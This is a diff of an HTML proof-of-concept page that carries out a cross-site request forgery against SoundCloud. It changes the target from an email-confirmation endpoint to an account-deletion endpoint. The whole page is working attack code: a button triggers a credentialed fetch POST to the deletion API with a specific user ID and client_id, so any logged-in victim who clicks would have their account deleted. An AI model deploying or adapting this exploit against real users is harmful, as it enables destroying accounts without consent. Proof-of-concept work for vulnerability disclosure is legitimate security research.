@@ -1,34 +1,35 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>SoundCloud CSRF PoC</title>
-  </head>
-  <body>
-    <h2>Click to Confirm Your Email</h2>
-    <button onclick="submitCSRF()">Submit Request</button>
+<head>
+  <title>SoundCloud Account Deletion CSRF PoC</title>
+</head>
+<body>
+  <h2>Dangerous Action: Delete Account</h2>
+  <button onclick="sendCSRF()">Submit Deletion Request</button>
 
-    <pre id="output" style="background:#eee; padding:10px; margin-top:10px;"></pre>
+  <pre id="output" style="background:#f0f0f0; padding:10px; margin-top:15px;"></pre>
 
-    <script>
-      function submitCSRF() {
-        fetch("https://api-v2.soundcloud.com/users/1417348911/emails/1582292418/confirmation", {
+  <script>
+    async function sendCSRF() {
+      const output = document.getElementById("output");
+      output.textContent = "Sending request...";
+
+      try {
+        const res = await fetch("https://api-v2.soundcloud.com/users/soundcloud:users:1417348911/deletion?client_id=CQzyZQR9J1A6DwlJEpfEiEDQbCbwOMfu&app_version=1748345262&app_locale=en", {
           method: "POST",
-          credentials: "include", // include cookies if present
+          credentials: "include", // sends cookies if user is logged in
           headers: {
             "Content-Type": "application/json"
-            // "Authorization": "Bearer <token>" // Only if token is available and CORS allows
           },
           body: JSON.stringify({})
-        })
-        .then(async (res) => {
-          const text = await res.text();
-          document.getElementById("output").textContent =
-            `Status: ${res.status}\n\nResponse:\n${text}`;
-        })
-        .catch((error) => {
-          document.getElementById("output").textContent = "Request failed:\n" + error;
         });
+
+        const responseText = await res.text();
+        output.textContent = `Status: ${res.status}\n\nResponse:\n${responseText}`;
+      } catch (err) {
+        output.textContent = "Request failed:\n" + err;
       }
-    </script>
-  </body>
+    }
+  </script>
+</body>
 </html>
